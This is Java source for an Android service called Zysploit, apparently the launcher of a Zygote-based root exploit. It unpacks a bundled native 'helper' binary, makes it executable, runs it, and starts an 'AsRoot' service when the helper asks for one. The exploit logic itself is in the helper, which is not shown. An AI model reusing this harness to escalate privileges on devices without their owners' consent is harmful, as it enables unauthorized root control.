package com.unrevoked.zysploit;

import java.lang.*;
import android.app.Service;
import android.app.IntentService;
import android.widget.Toast;
import android.util.Log;
import android.os.Looper;
import android.os.IBinder;
import android.content.Intent;
import android.content.res.Resources;

import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.io.BufferedReader;

public class Zysploit extends IntentService {
	private final int EXTRACTBUF_SIZE = 1024;
	
	private void say(String s)
	{
		Toast.makeText(getApplicationContext(), s, Toast.LENGTH_SHORT).show();
	}
	
	private int unpack()
	{
		Resources res = getResources();
		InputStream inpf = res.openRawResource(R.raw.helper);
		FileOutputStream oupf;
		String home = getApplicationContext().getFilesDir().getAbsolutePath();
		byte[] buf = new byte[EXTRACTBUF_SIZE];
		File f;
		int count;
		
		try {
			oupf = new FileOutputStream(home + "/helper");
		} catch (Exception e) {
			Log.e("Zysploit", "Helper extraction failed to open output.");
			return -1;
		}
		
		try {
			while ((count = inpf.read(buf)) > 0)
				oupf.write(buf, 0, count);
		
			inpf.close();
			oupf.close();
		} catch (java.io.IOException e) {
			Log.e("Zysploit", "Helper extraction failed to write output.");
			return -1;
		}
		
		f = new File(home, "helper");
		try {
			Runtime.getRuntime().exec("chmod 755 "+home+"/helper").waitFor();
		} catch (Exception e) {
			Log.e("Zysploit", "Helper extraction failed to set helper executable.");
			return -1;
		}
		
		Log.v("Zysploit", "Helper extracted.");
		
		return 0;
	}
	
	private void runhelper()
	{
		Process p;
		String home = getApplicationContext().getFilesDir().getAbsolutePath();
		BufferedReader reader;
		String s;
		
		Log.v("Zysploit", "Starting helper.");
		
		try {
			p = Runtime.getRuntime().exec(home+"/helper "+home+"/helper.log");
		} catch (Exception e) {
			Log.e("Zysploit", "Failed to exec helper.", e);
			return;
		}
		
		try {
			reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((s = reader.readLine()) != null)
			{
				switch (s.charAt(0))
				{
				case 'L':
					Log.v("Zysploit", "Helper: "+(s.substring(1)));
					break;
				case 'E':
					Log.e("Zysploit", "Helper error: "+(s.substring(1)));
					break;
				case 'S':
					android.content.ComponentName cn;
					
					Log.v("Zysploit", "Helper requests Zygote process spawn");
					
					cn = getApplicationContext()
					       .startService(
					         new Intent("com.unrevoked.zysploit.AsRoot"));
					if (cn == null)
						Log.e("Zysploit", "Failed to start AsRoot service.");
					else
						Log.v("Zysploit", "Started service "+cn.toString()+".");
					
					p.getOutputStream().write('\n');	/* OK, you may proceed. */
					
					break;
				default:
					Log.e("Zysploit", "Unknown helper string: "+s);
					break;
				}
			}
		} catch (Exception e) {
			Log.e("Zysploit", "Unexpected IOException reading from helper.", e);
			return;
		}
		
		Log.v("Zysploit", "Helper done.");
	}
	
	@Override
	protected void onHandleIntent(Intent i)
	{
		Log.v("Zysploit", "Inside main service thread.");
		
		if (unpack() < 0)
		{
			Log.e("Zysploit", "Failed to extract helper -- aborting.");
			return;
		}
		
		runhelper();
		
		Log.v("Zysploit", "Main service thread done.");
	}
	
	@Override
	public void onStart(Intent i, int startId)
	{
		super.onStart(i, startId);
		
		Log.v("Zysploit", "Started.");
	}
	
	@Override
	public IBinder onBind(Intent i)
	{
		super.onBind(i);
		
		Log.v("Zysploit", "Bound.");
		
		return null;
	}
	
	public Zysploit(String s)
	{
		super(s);
	}
	
	public Zysploit()
	{
		super("");
	}
}
